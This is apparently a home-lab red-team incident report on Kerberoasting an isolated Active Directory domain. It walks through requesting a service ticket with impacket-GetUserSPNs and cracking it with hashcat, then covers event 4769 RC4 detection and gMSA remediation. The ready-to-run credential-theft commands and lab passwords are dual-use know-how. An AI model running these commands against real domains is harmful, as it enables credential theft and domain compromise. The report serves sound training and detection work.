# INCIDENT REPORT #3

## Alert summary
During authorized red-team testing in my isolated home lab, a **Kerberoasting**
attack was carried out against the `lab.local` Active Directory domain. Starting
from a single low-privileged domain account (`anna`), a Kerberos service ticket
(TGS) was requested for the service account `svc_sql`, exported, and cracked
offline. The service account's weak password was recovered in cleartext
(`Password1`). This demonstrates how any authenticated domain user can obtain
the credentials of a service account that has a Service Principal Name (SPN)
and a guessable password.

- **Attack type:** Credential Access → Kerberoasting → Offline password cracking
- **Affected object:** Service account `svc_sql` (SPN `MSSQL/sql.lab.local:1433`)
- **Privilege required:** Any valid domain user (no admin rights)
- **MITRE ATT&CK techniques:** T1087.002, T1558.003, T1110.002, T1078.002

## Lab environment
| Role | Host | IP | OS |
|---|---|---|---|
| Domain controller | DC01.lab.local | 192.168.56.10 | Windows Server 2022 (Eval) |
| Domain client | DESKTOP-S3QQCUD | 192.168.56.11 | Windows 11 Enterprise (Eval) |
| Attacker | kali | 192.168.56.12 | Kali Linux |

- **Domain:** `lab.local`, single forest, built with `Install-ADDSForest`.
- **Network:** VirtualBox host-only, isolated (no internet). All three VMs on the
  same host-only adapter.
- **Seeded weakness:** the AD objects, including `svc_sql`, were created by the
  lab build script [`build-lab-ad.ps1`](./build-lab-ad.ps1). `svc_sql` was given
  the SPN `MSSQL/sql.lab.local:1433` and the deliberately weak password
  `Password1`.
- **Starting foothold:** credentials of one ordinary user, `anna` /
  `Host2027!x`. No elevated rights.

> **Note — initial access.** Kerberoasting requires one valid domain account, but
> not an elevated one. This lab assumes that foothold for convenience; a real
> attacker would first obtain it (typically by enumerating usernames and
> password spraying, which need no known password — or via phishing, network
> hash capture, AS-REP roasting, or exploiting a domain-joined service). The full
> "unknown attacker → first account → pivot" chain is described in report #4.

## Timeline
- Logged in from the Kali attacker VM with low-privileged domain credentials
  (`anna`).
- Enumerated service accounts with SPNs using `impacket-GetUserSPNs`; found
  `svc_sql` (SPN `MSSQL/sql.lab.local:1433`).
- Requested a TGS for `svc_sql` and exported the hash with the `-request` flag.
- Cracked the `$krb5tgs$` hash offline with `hashcat` (mode 13100) against the
  `rockyou` wordlist; `Password1` recovered in ~90 seconds on CPU.

## Attack walkthrough (reproducible)

All commands run from the Kali VM. Only a valid low-privileged domain account is
required.

### 1. Request and export the service ticket
```bash
impacket-GetUserSPNs lab.local/anna:'Host2027!x' \
    -dc-ip 192.168.56.10 -request -outputfile svc_sql.hash
```
Expected: the tool lists `svc_sql` with SPN `MSSQL/sql.lab.local:1433` and writes
a `$krb5tgs$23$*svc_sql$LAB.LOCAL$...` hash to `svc_sql.hash`.

### 2. Crack the hash offline
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # only if still compressed
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 svc_sql.hash --show
```
Expected: `Status: Cracked`, hash ends in `:Password1`. On a VM without GPU
passthrough, hashcat runs on CPU; add `--force` if it complains about the
OpenCL/GPU backend.

## Operational notes (gotchas during execution)
- **Kerberos clock skew.** `impacket-GetUserSPNs -request` failed with
  `KRB_AP_ERR_SKEW (Clock skew too great)` because the attacker and DC clocks had
  drifted more than 5 minutes apart (common with paused/snapshotted VMs). Fix:
  read the DC's UTC time and set the attacker clock to match.
  ```bash
  sudo nmap -p445 --script smb2-time 192.168.56.10   # shows DC time (UTC)
  sudo date -u -s "2026-11-23 18:58:15"              # set attacker to that UTC time
  ```
- **Impacket binary names are case-sensitive and inconsistent.** It is
  `impacket-GetUserSPNs` (capital G) but `impacket-getTGT` (lowercase g). A wrong
  case gives `command not found`.

## Severity
**High.** Any authenticated domain user — the lowest possible level of access —
was able to recover the cleartext password of a service account. In a real
environment such accounts frequently hold elevated privileges (local admin on
many hosts, or even domain privileges), so this is a common and reliable step on
the path to full domain compromise.

## Detection

### Audit prerequisite
Event **4769** (Kerberos Service Ticket Operations) is logged **by default on a
domain controller**, so no extra configuration was needed for this attack. (The
related Kerberos *authentication* events 4768/4771 are **not** on by default —
see report #4.) The underlying principle: a detection only works if the source
event is actually being audited.

### What it looks like
This attack is visible on the domain controller as **event 4769** with the
Kerberoasting signature: a service ticket for the targeted service account,
requested with **RC4 (0x17)** encryption. Raw 4769 volume is very high in normal
operation, so detection depends on filtering, not on the event's presence.

Filtering on the DC with PowerShell isolates the attack from the noise:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769} -MaxEvents 300 |
  Where-Object { $_.Message -match 'svc_sql' -and $_.Message -match '0x17' } |
  Format-List TimeCreated, Message
```

Actual captured event (fields trimmed):
```
A Kerberos service ticket was requested.
  Account Name:            anna@LAB.LOCAL
  Service Name:            svc_sql
  Client Address:          ::ffff:192.168.56.1
  Ticket Encryption Type:  0x17        <-- RC4, the Kerberoasting indicator
  Failure Code:            0x0
```

### Detection logic
Alert on **event 4769 where Ticket Encryption Type = 0x17 (RC4)** against a
service account. Normal service tickets use **0x12 (AES256)**, so RC4 requests
stand out. A single account requesting tickets for many different SPNs in a short
window strengthens the signal. This same filter is implemented as a KQL rule in
the SIEM phase of this lab (Microsoft Sentinel / Wazuh).

## Remediation
- **Use strong, managed service-account passwords.** Replace standalone service
  accounts with **Group Managed Service Accounts (gMSA)**, which use long,
  automatically rotated passwords that cannot realistically be cracked offline.
- Where a gMSA is not possible, set a long (25+ character) random password on the
  service account.
- **Disable RC4** for Kerberos where supported, forcing AES encryption, which
  raises the cost of offline cracking.
- **Monitor and alert** on event 4769 with RC4 encryption, and on a single
  principal requesting many service tickets.
- Audit which accounts have SPNs (`GetUserSPNs` / `Get-ADUser -Filter
  {ServicePrincipalName -like "*"}`) and remove SPNs that are no longer needed.

## MITRE ATT&CK
| Technique | ID | Stage |
|---|---|---|
| Account Discovery: Domain Account | T1087.002 | Enumerate accounts with SPNs |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Request and export the TGS |
| Brute Force: Password Cracking | T1110.002 | Offline hashcat cracking |
| Valid Accounts: Domain Accounts | T1078.002 | Recovered service-account credentials |

## Tools used
`impacket-GetUserSPNs`, `hashcat` (mode 13100), `nmap` (smb2-time), `rockyou`
wordlist.
